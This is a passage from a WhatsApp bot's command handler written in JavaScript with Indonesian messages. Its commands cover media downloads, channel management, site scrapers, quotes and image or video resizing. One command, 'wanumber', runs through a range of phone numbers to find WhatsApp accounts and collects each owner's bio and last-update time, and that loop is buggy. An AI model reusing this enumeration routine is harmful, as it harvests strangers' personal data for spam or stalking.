            paramsJson: JSON.stringify({
              title: 'Pilih Format Download',
              sections: [
                {
                  title: 'Opsi Download',
                  highlight_label: 'Recommended',
                  rows: [
                    {
                      title: 'YouTube Music',
                      id: `${prefix}ytmp3 ${url}`
                    },
                    {
                      title: 'YouTube Music V2',
                      id: `${prefix}ytmp3-v2 ${url}`
                    },
                    {
                      title: 'YouTube Video',
                      id: `${prefix}ytmp4 ${url}`
                    },
                    {
                      title: 'YouTube Video V2',
                      id: `${prefix}ytmp4-v2 ${url}`
                    },
                    {
                      title: 'YouTube Video V3',
                      id: `${prefix}ytmp4-v3 ${url}`
                    }
                  ]
                }
              ]
            })
          }
        }
      ],
      headerType: 1,
      viewOnce: true,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idSaluran,
          newsletterName: global.namaSaluran
        }
      }
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    m.reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
  }
}
break
case 'getinfoch': {
  if (!text) return m.reply('Contoh: getinfoch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v');
  if (!text.includes("https://whatsapp.com/channel/")) {
    return m.reply("Link tautan tidak valid");
  }

  try {
    let result = text.split('https://whatsapp.com/channel/')[1];
    let metadata = await conn.newsletterMetadata("invite", result);
    let teks = `
      *ID Channel:* ${metadata.id}
      *Nama:* ${metadata.name}
      *Deskripsi:* ${metadata.description}
      *Total Pengikut:* ${metadata.subscribers}
      *Status:* ${metadata.state}
      *Verified:* ${metadata.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
    `;
    return m.reply(teks);
  } catch (e) {
    console.log(e);
    return m.reply('Gagal mengambil data channel.');
  }
}
break
case 'searchdouyin': case 'douyinsearch': {
    if (!text) return m.reply('Masukkan kata kunci pencarian!\nContoh: douyinsearch fifty fifty');
    const axios = require('axios');
    const cheerio = require('cheerio');
    const vm = require('vm');
    const DouyinSearchPage = class {
        constructor() {
            this.baseURL = 'https://so.douyin.com/';
            this.defaultParams = {
                search_entrance: 'aweme',
                enter_method: 'normal_search',
                innerWidth: '431',
                innerHeight: '814',
                reloadNavStart: String(Date.now()),
                is_no_width_reload: '1',
                keyword: '',
            };
            this.cookies = {};
            this.api = axios.create({
                baseURL: this.baseURL,
                headers: {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id-ID,id;q=0.9',
                    'referer': 'https://so.douyin.com/',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
                }
            });
            this.api.interceptors.response.use(res => {
                const setCookies = res.headers['set-cookie'];
                if (setCookies) {
                    setCookies.forEach(c => {
                        const [name, value] = c.split(';')[0].split('=');
                        if (name && value) this.cookies[name] = value;
                    });
                }
                return res;
            });
            this.api.interceptors.request.use(config => {
                if (Object.keys(this.cookies).length) {
                    config.headers['Cookie'] = Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
                }
                return config;
            });
        }
        async initialize() {
            try {
                await this.api.get('/');
                return true;
            } catch {
                return false;
            }
        }
        async search({ query }) {
            await this.initialize();
            const params = { ...this.defaultParams, keyword: query, reloadNavStart: String(Date.now()) };
            const res = await this.api.get('s', { params });
            const $ = cheerio.load(res.data);
            let scriptWithData = '';
            $('script').each((_, el) => {
                const text = $(el).html();
                if (text.includes('let data =') && text.includes('"business_data":')) {
                    scriptWithData = text;
                }
            });
            const match = scriptWithData.match(/let\s+data\s*=\s*(\{[\s\S]+?\});/);
            if (!match) throw 'Data tidak ditemukan di halaman.';
            const dataCode = `data = ${match[1]}`;
            const sandbox = {};
            vm.createContext(sandbox);
            vm.runInContext(dataCode, sandbox);
            const awemeInfos = sandbox.data?.business_data
                ?.map(entry => entry?.data?.aweme_info)
                .filter(Boolean);
            return awemeInfos;
        }
    };

    try {
        const douyin = new DouyinSearchPage();
        const results = await douyin.search({ query: text });
        if (!results.length) return m.reply('Tidak ditemukan hasil.');
        const message = results.slice(0, 5).map((v, i) => {
            return `*${i + 1}.* ${v.desc || 'Tanpa deskripsi'}\n👤: ${v.author?.nickname}\n❤️: ${v.statistics?.digg_count} | 💬: ${v.statistics?.comment_count}\n🔗: https://www.douyin.com/video/${v.aweme_id}`;
        }).join('\n\n');
        m.reply(message);
    } catch (err) {
        console.error(err);
        m.reply('Gagal mengambil hasil pencarian Douyin.');
    }
}
    break
case 'delch': {
     if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply('Contoh: delch https://whatsapp.com/channel/xx');
  if (!text.includes("https://whatsapp.com/channel/")) {
    return m.reply("Link tautan tidak valid");
  }

  try {
    let result = text.split('https://whatsapp.com/channel/')[1];
    let metadata = await conn.newsletterMetadata("invite", result);
    await conn.newsletterDelete(metadata.id);
    return m.reply(`Channel dengan ID ${metadata.id} berhasil dihapus.`);
  } catch (e) {
    console.log(e);
    return m.reply('Gagal menghapus channel.');
  }
}
break
case 'ttsanime': {
  if (!q) return m.reply('Masukkan teksnya!\nContoh: .ttsanime aku suka ramen');

  try {
    const res = await fetch(`https://flowfalcon.dpdns.org/tools/text-to-speech?text=${encodeURIComponent(q)}`);
    const json = await res.json();
    if (!json.status || !json.result) return m.reply('Gagal generate suara.');
    for (const voice of json.result) {
      const name = voice.voice_name;
      const voiceId = voice.voice_id;
      const url = Object.values(voice).find(v => typeof v === 'string' && v.startsWith('https'));
      if (url) {
        await conn.sendMessage(m.chat, {
          audio: { url },
          mimetype: 'audio/mp4',
          ptt: true,
          contextInfo: {
            externalAdReply: {
              title: `Voice: ${name}`,
              body: `Voice ID: ${voiceId}`,
              renderLargerThumbnail: true,
              mediaType: 2,
              mediaUrl: url,
              thumbnailUrl: 'https://files.catbox.moe/zxnzgb.jpeg', 
              sourceUrl: 'https://flowfalcon.dpdns.org/tools/text-to-speech'
            }
          }
        }, { quoted: m });
        await delay(1000); 
      }
    }
  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan saat memproses TTS.');
  }
}
break
case 'setppch': {
     if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(`Contoh: *${prefix}setppch https://whatsapp.com/channel/0029Vb6aLqdDTkK7UqHszT3V*`);
  if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link channel tidak valid.");
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const isImage = mime.startsWith('image/');
  if (!isImage) return m.reply(`Kirim atau reply gambar dengan caption *${prefix + command}*`);

  try {
    const buffer = await quoted.download?.();
    const idRaw = text.split("https://whatsapp.com/channel/")[1];
    const metadata = await conn.newsletterMetadata("invite", idRaw.trim());
    const idch = metadata.id;
    await conn.newsletterUpdatePicture(idch, buffer);
    return m.reply(`Foto profil untuk channel *${metadata.name}* berhasil diperbarui.`);
  } catch (e) {
    console.log('ERROR SETPPCH:', e);
    return m.reply('Gagal mengubah foto profil channel. Pastikan kamu adalah admin channel dan gambar valid.');
  }
}
break
case 'mutech':
case 'unmutech': {
     if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(`Contoh: *${prefix + command} https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v*`);
  if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link channel tidak valid.");

  try {
    const idRaw = text.split("https://whatsapp.com/channel/")[1];
    const metadata = await conn.newsletterMetadata("invite", idRaw.trim());
    const idch = metadata.id;
    if (command === 'mutech') {
      await conn.newsletterMute(idch);
      return m.reply(`Channel *${metadata.name}* berhasil di *mute*.`);
    } else {
      await conn.newsletterUnmute(idch);
      return m.reply(`Channel *${metadata.name}* berhasil di *unmute*.`);
    }
  } catch (e) {
    console.log('ERROR MUTE/UNMUTE:', e);
    return m.reply('Gagal memproses permintaan mute/unmute channel.');
  }
}
break
 case 'createch': {
     if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply(`Contoh:\ncreatech Nama Channel|Deskripsi Channel\n\nBisa juga hanya: createch Nama Channel`)
    const [name, description] = text.split('|').map(v => v.trim())
    if (!name) return m.reply('Nama channel tidak boleh kosong!')

    try {
        const res = await conn.newsletterCreate(name, description || '')
        if (!res || typeof res !== 'object' || !res.id) {
            console.log('DEBUG NewsletterCreate Response:', res)
            return m.reply('Cek coba udah ada apa belum.')
        }
        m.reply(`Berhasil membuat channel:\n\nID: ${res.id}\nNama: ${name}\nDeskripsi: ${description || '-'}`)
    } catch (e) {
        console.error('ERROR Newsletter Create:', e)
        m.reply('Coba Cek Udh Kebuat/Blum.')
    }
}
    break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "wanumber": case "searchno": case "searchnumber": case "carinomer": {
           	if (!text) return m.reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        m.reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = conn.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await conn.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        m.reply(`${text66}${nobio}${nowhatsapp}`)
        }
break

case "quotesislami": case "islam": {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    m.reply(`${arabic}\n${arti}`)
}
break
case 'mojeek': {
  if (!text) return m.reply('Contoh: mojeek Anime')

  try {
const axios = require('axios');
const cheerio = require('cheerio');
    const res = await axios.get('https://www.mojeek.com/search', {
      params: { q: text },
      headers: { 'User-Agent': 'Mozilla/5.0' }
    })
    const $ = cheerio.load(res.data)
    const results = []
    $('ul.results-standard li').each((_, el) => {
      const title = $(el).find('h2 a.title').text().trim()
      const url = $(el).find('a.ob').attr('href')
      const description = $(el).find('p.s').text().trim()
      if (title && url) results.push({ title, url, description })
    })
    if (results.length === 0) return m.reply('Tidak ada hasil.')
    let teks = `*Hasil pencarian Mojeek untuk:* ${text}\n\n`
    for (let i = 0; i < results.length; i++) {
      teks += `*${i + 1}. ${results[i].title}*\n${results[i].url}\n_${results[i].description}_\n\n`
    }
    m.reply(teks.trim())
  } catch (e) {
    console.error(e)
    m.reply('Terjadi kesalahan saat mencari.')
  }
}
break
case 'totalchat':
case 'statgroup': {
  const stats = getTodayStats(m.chat)
  if (Object.keys(stats).length === 0) return m.reply('Belum ada data chat hari ini.')
  let teks = `*Statistik Chat Hari Ini (${m.isGroup ? "Grup" : "Pribadi"}):*\n\n`
  const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1])
  let i = 1
  for (const [user, total] of sorted) {
    const name = conn.getName ? await conn.getName(user) : user.split('@')[0]
    teks += `${i++}. ${name} - ${total} chat\n`
  }
  m.reply(teks)
}
break
case 'ytmp3mobi': {
  if (!q) return m.reply(`Contoh: ${prefix + command} https://youtu.be/WK-PlNz52FM`);
  const youtubeUrl = q.trim();
  const availableFormat = ["mp3", "mp4"];

  try {
    const ytmp3mobi = async (youtubeUrl, format = "mp3") => {
      const regYoutubeId = /https:\/\/(www.youtube.com\/watch\?v=|youtu.be\/|youtube.com\/shorts\/|youtube.com\/watch\?v=)([^&|^?]+)/;
      const videoId = youtubeUrl.match(regYoutubeId)?.[2];
      if (!videoId) throw Error("Link YouTube tidak valid!");
      const urlParam = {
        v: videoId,
        f: format,
        _: Math.random()
      };
      const headers = {
        "Referer": "https://id.ytmp3.mobi/",
      };
      const fetchJson = async (url, info) => {
        const res = await fetch(url, { headers });
        if (!res.ok) throw Error(`Gagal fetch ${info} | ${res.status}`);
        return await res.json();
      };
      const { convertURL } = await fetchJson("https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=" + Math.random(), "convertURL");
      const { progressURL, downloadURL } = await fetchJson(`${convertURL}&${new URLSearchParams(urlParam).toString()}`, "progressURL");
      let error, progress, title;
      while (progress != 3) {
        ({ error, progress, title } = await fetchJson(progressURL, "progress check"));
        if (error) throw Error(`Gagal konversi: ${error}`);
      }
      return { title, downloadURL };
    };
    await m.reply(`*YTMP3MOBI Converter*\n\nLink terdeteksi:\n${youtubeUrl}\n\nFormat tersedia:\n${availableFormat.map(f => `• ${f.toUpperCase()}`).join("\n")}\n\nSedang memproses...`);
    for (let fmt of availableFormat) {
      try {
        let { title, downloadURL } = await ytmp3mobi(youtubeUrl, fmt);
        await m.reply(`*Format:* ${fmt.toUpperCase()}\n*Judul:* ${title}\n*Link:* ${downloadURL}`);
        await conn.sendMessage(m.chat, {
          [fmt === "mp3" ? "audio" : "video"]: { url: downloadURL },
          mimetype: fmt === "mp3" ? 'audio/mp4' : 'video/mp4',
          fileName: `${title}.${fmt}`
        }, { quoted: m });
      } catch (err) {
        await m.reply(`*Format:* ${fmt.toUpperCase()}\nGagal: ${err.message}`);
      }
    }
  } catch (e) {
    m.reply(`Gagal: ${e.message}`);
  }
}
  break
case 'gpt1image':
case 'gptimg': {
    if (!q) return m.reply("Contoh: *.gpt1image kucing lucu terbang ke luar angkasa dengan jetpack*")
    await conn.sendMessage(m.chat, {
        react: {
            text: "🤖",
            key: m.key
        }
    })
    m.reply("Sabar yah, sedang membuat gambar dari imajinasimu...\nProses ini mungkin agak lama, tunggu sebentar...")

    try {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }
        const body = JSON.stringify({
            prompt: q,
            n: 1,
            size: "1024x1024",
            is_enhance: true,
            response_format: "url"
        })
        const res = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            method: "POST",
            headers,
            body
        })
        if (!res.ok) return m.reply(`Gagal mengambil gambar dari server.\nStatus: ${res.status} ${res.statusText}`)
        const data = await res.json()
        const imgUrl = data?.data?.[0]?.url
        if (!imgUrl) return m.reply("Gambar berhasil dibuat tapi URL kosong. Mungkin ada gangguan dari server.")
        conn.sendMessage(m.chat, { image: { url: imgUrl }, caption: `Gambar untuk:\n${q}` }, { quoted: m })
    } catch (err) {
        m.reply("Terjadi error saat membuat gambar: " + err.message)
    }
}
break
case 'anime9': {
    if (!q) return m.reply('Masukkan query atau link anime dari 9animetv.to');
    await conn.sendMessage(m.chat, {
        react: { text: '🕒', key: m.key }
    });
    class anime9 {
        async search(anime) {
            const axios = require('axios');
            const cheerio = require('cheerio');
            const { data } = await axios.get(`https://9animetv.to/search?keyword=${anime}`);
            const $ = cheerio.load(data);
            const result = [];
            $('.flw-item').each((i, element) => {
                const title = $(element).find('.film-name a').attr('title');
                const url = 'https://9animetv.to' + $(element).find('.film-name a').attr('href');
                const imgSrc = $(element).find('.film-poster-img').attr('data-src');
                const quality = $(element).find('.tick-quality').text();
                const subOrDub = $(element).find('.tick-sub').text() || $(element).find('.tick-dub').text();
                const episode = $(element).find('.tick-eps').text().replace(/\s+/g, ' ').trim();
                result.push({
                    title,
                    url,
                    imgSrc,
                    quality,
                    subOrDub,
                    episode
                });
            });
            return result;
        }
        async details(url) {
            try {
                const axios = require('axios');
                const cheerio = require('cheerio');
                const { data } = await axios.get(url);
                const $ = cheerio.load(data);
                const title = $(".film-name").text().trim();
                const image = $(".film-poster img").attr("src");
                const alias = $(".alias").text().trim();
                const description = $(".film-description p").text().trim();
                const type = $(".item-title:contains('Type:')").next().text().trim();
                const studio = $(".item-title:contains('Studios:')").next().text().trim();
                const aired = $(".item-title:contains('Date aired:')").next().text().trim();
                const status = $(".item-title:contains('Status:')").next().text().trim();
                const score = $(".item-title:contains('Scores:')").next().text().trim();
                const duration = $(".item-title:contains('Duration:')").next().text().trim();
                const quality = $(".item-title:contains('Quality:')").next().text().trim();
                const views = $(".item-title:contains('Views:')").next().text().trim();
                const genres = [];
                $(".item-title:contains('Genre:')").next().find("a").each((_, el) => {
                    genres.push($(el).text().trim());
                });
                return {
                    title,
                    image,
                    alias,
                    description,
                    type,
                    studio,
                    aired,
                    status,
                    score,
                    duration,
                    quality,
                    views,
                    genres
                };
            } catch (error) {
                console.error("Error fetching details:", error);
                return null;
            }
        }
    }

    try {
        if (/9animetv.to/.test(q)) {
            const result = await new anime9().details(q);
            const caption = `──Detail Anime9
📙 Alias: ${result.alias || ''}
📑 Description: ${result.description ? result.description.slice(0, 4096) + (result.description.length > 4096 ? '...' : '') : '-'}
🧩 Type: ${result.type || ''}
👤 Studio: ${result.studio || ''}
⬆️ Date: ${result.aired || ''}
⭐ Score: ${result.score || ''}
🧩 Genre: ${result.genres.map(a => `${'#' + a}`).join(", ") || ''}`;
            m.reply(caption);
        } else {
            const result = await new anime9().search(q);
            await conn.sendMessage(m.chat, {
                text: `Search *${q}*!`,
                footer: '9animetv.to',
                interactiveButtons: [{
                    name: 'single_select',
                    buttonParamsJson: JSON.stringify({
                        title: 'single select',
                        sections: [{
                            title: 'Result Search',
                            highlight_label: 'Highlight label 1',
                            rows: result.map((v, i) => ({
                                title: `${i + 1} ${v.title}`,
                                description: `${v.quality} \\ ${v.subOrDub} \\ ${v.episode}`,
                                id: `${prefix}anime9 ${v.url}`
                            }))
                        }]
                    })
                }]
            }, { quoted: m });
        }
    } catch (e) {
        m.reply('❌ Maaf, kemungkinan error atau terlalu banyak request.');
        console.error('Error anime9:', e);
    }
}
break
case 'resizeimg': case 'resizeimage': {
  const fs = require('fs')
  const path = require('path')
  const sharp = require('sharp')
  const { downloadMediaMessage } = require('@whiskeysockets/baileys')
  const tmpFolder = path.join(__dirname, 'tmp')
  if (!fs.existsSync(tmpFolder)) fs.mkdirSync(tmpFolder)
  const qmsg = m.quoted
  const isQuotedImage = qmsg?.mimetype?.startsWith('image') || qmsg?.type === 'imageMessage' || qmsg?.mtype === 'imageMessage'
  const standardWidths = [100, 250, 500, 720, 1080]
  if (!isQuotedImage) {
    return conn.sendMessage(m.chat, {
      text: `*Kamu harus reply ke gambar!*\nContoh:\nBalas gambar lalu ketik:\nresizeimage\natau\nresizeimage 500`
    }, { quoted: m })
  }
  if (!argsbiyuoffc[0]) {
    return sharp(await downloadMediaMessage(qmsg, 'buffer'))
      .metadata()
      .then(meta => {
        const originalWidth = meta.width
        const originalHeight = meta.height
        const aspectRatio = originalWidth / originalHeight
        let sizeListText = standardWidths
          .map(w => {
            const h = Math.round(w / aspectRatio)
            return `• ${w}x${h}`
          }).join('\n')
        return conn.sendMessage(m.chat, {
          text: `Ukuran asli gambar: *${originalWidth}x${originalHeight}*\n\nDaftar ukuran resize yang tersedia (tinggi menyesuaikan rasio):\n${sizeListText}\n\nContoh penggunaan:\nresizeimage 100\nresizeimage 500\nresizeimage 1080`
        }, { quoted: m })
      })
  }
  let inputWidth = parseInt(argsbiyuoffc[0].trim())
  if (isNaN(inputWidth)) inputWidth = 1080

  try {
    const imageBuffer = await downloadMediaMessage(qmsg, 'buffer')
    const filename = `${Date.now()}`
    const inputPath = path.join(tmpFolder, `${filename}.jpg`)
    const outputPath = path.join(tmpFolder, `${filename}_resized.jpg`)
    fs.writeFileSync(inputPath, imageBuffer)
    const metadata = await sharp(inputPath).metadata()
    const originalWidth = metadata.width
    const originalHeight = metadata.height
    const aspectRatio = originalWidth / originalHeight
    let newWidth = inputWidth > originalWidth ? originalWidth : inputWidth
    let newHeight = Math.round(newWidth / aspectRatio)
    await conn.sendMessage(m.chat, { text: `Sedang meresize gambar ke *${newWidth}x${newHeight}*...` }, { quoted: m })
    await sharp(inputPath)
      .resize(newWidth, newHeight)
      .toFile(outputPath)
    await conn.sendMessage(m.chat, {
      image: fs.readFileSync(outputPath),
      caption: `Berhasil resize gambar ke *${newWidth}x${newHeight}*`
    }, { quoted: m })
    fs.unlinkSync(inputPath)
    fs.unlinkSync(outputPath)
  } catch (err) {
    console.error(err)
    conn.sendMessage(m.chat, {
      text: `Gagal resize gambar:\n\n${err.message}`
    }, { quoted: m })
  }
}
break
case 'resizevideo': case 'resizevid': {
  const fs = require('fs')
  const path = require('path')
  const { spawn } = require('child_process')
  const { downloadMediaMessage } = require('@whiskeysockets/baileys')
  const tmpFolder = path.join(__dirname, 'tmp')
  if (!fs.existsSync(tmpFolder)) fs.mkdirSync(tmpFolder)
  const qmsg = m.quoted
  const isQuotedVideo = qmsg?.mimetype?.startsWith('video') || qmsg?.type === 'videoMessage' || qmsg?.mtype === 'videoMessage'
  if (!isQuotedVideo) {
    return conn.sendMessage(m.chat, {
      text: `*Kamu harus reply ke video!*\nContoh:\nBalas video lalu ketik:\nresizevideo\natau\nresizevideo 640`
    }, { quoted: m })
  }
  const standardWidths = [360, 480, 640, 720, 1080]

  try {
    const videoBuffer = await downloadMediaMessage(qmsg, 'buffer', {}, { reuploadRequest: conn.updateMedia })
    const filename = `${Date.now()}`
    const inputPath = path.join(tmpFolder, `${filename}.mp4`)
    const outputPath = path.join(tmpFolder, `${filename}_resized.mp4`)
    fs.writeFileSync(inputPath, videoBuffer)
    const getResolution = () => new Promise((resolve, reject) => {
      const ffprobe = spawn('ffprobe', [
        '-v', 'error',
        '-select_streams', 'v:0',
        '-show_entries', 'stream=width,height',
        '-of', 'csv=p=0:s=x',
        inputPath
      ])
      let data = ''
      ffprobe.stdout.on('data', chunk => data += chunk)
      ffprobe.on('close', () => {
        const [width, height] = data.trim().split('x').map(Number)
        if (!width || !height) return reject(new Error('Gagal mendapatkan resolusi video'))
        resolve({ width, height })
      })
      ffprobe.on('error', reject)
    })
    const res = await getResolution()
    const originalWidth = res.width
    const originalHeight = res.height
    const aspectRatio = originalWidth / originalHeight
    let inputWidth = argsbiyuoffc[0] ? parseInt(argsbiyuoffc[0].trim()) : 1080
    if (isNaN(inputWidth)) inputWidth = 1080
    if (!argsbiyuoffc[0]) {
      let sizeListText = standardWidths
        .map(w => {
          const h = Math.round(w / aspectRatio)
          return `• ${w}x${h}`
        }).join('\n')
      return conn.sendMessage(m.chat, {
        text: `Ukuran asli video: *${originalWidth}x${originalHeight}*\n\nDaftar ukuran resize yang tersedia (tinggi menyesuaikan rasio):\n${sizeListText}\n\nContoh penggunaan:\nresizevideo 360\nresizevideo 640\nresizevideo 1080`
      }, { quoted: m })
    }
    let newWidth = inputWidth > originalWidth ? originalWidth : inputWidth
